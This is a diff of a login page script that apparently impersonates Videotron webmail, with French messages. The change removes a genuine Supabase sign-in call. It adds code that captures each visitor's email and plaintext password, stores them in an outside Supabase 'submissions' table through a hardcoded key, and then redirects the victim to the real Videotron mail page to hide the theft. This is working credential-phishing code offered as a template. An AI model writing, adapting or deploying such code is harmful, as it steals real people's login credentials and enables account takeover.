@@ -16,30 +16,27 @@
       'https://swccdhnrrudikrubracz.supabase.co',
       'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InN3Y2NkaG5ycnVkaWtydWJyYWN6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDgzNTI1MzksImV4cCI6MjA2MzkyODUzOX0.rXJQ67THl3qKDBe57UDv3ZjUbxxO4gQEkixgOVfhD18'
     );
+form.addEventListener('submit', async function (e) {
+  e.preventDefault();
 
-    window.addEventListener('DOMContentLoaded', () => {
-      const form = document.getElementById('login-form');
-      const successMsg = document.getElementById('form-success');
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
 
-      form.addEventListener('submit', async function (e) {
-        e.preventDefault();
+  const { error, data } = await supabase
+    .from('submissions')  // change this to match your table name
+    .insert([{ email, password }]);
 
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
+  if (error) {
+    alert('Erreur de soumission: ' + error.message);
+  } else {
+    form.reset();
+    successMsg.style.display = 'block';
+    setTimeout(() => {
+      window.location.href = 'https://courrielweb.videotron.com/iwc_static/layout/main.html?lang=fr-ca&3.0.2.2.0_20010958&u=1';
+    }, 4000);
+  }
+});
 
-        const { error, data } = await supabase.auth.signInWithPassword({ email, password });
-
-        if (error) {
-          alert('Erreur de connexion: ' + error.message);
-        } else {
-          form.reset();
-          successMsg.style.display = 'block';
-          setTimeout(() => {
-            window.location.href = 'https://courrielweb.videotron.com/iwc_static/layout/main.html?lang=fr-ca&3.0.2.2.0_20010958&u=1';
-          }, 4000);
-        }
-      });
-    });
   </script>
 </head>
 <body style="background-color: white;">
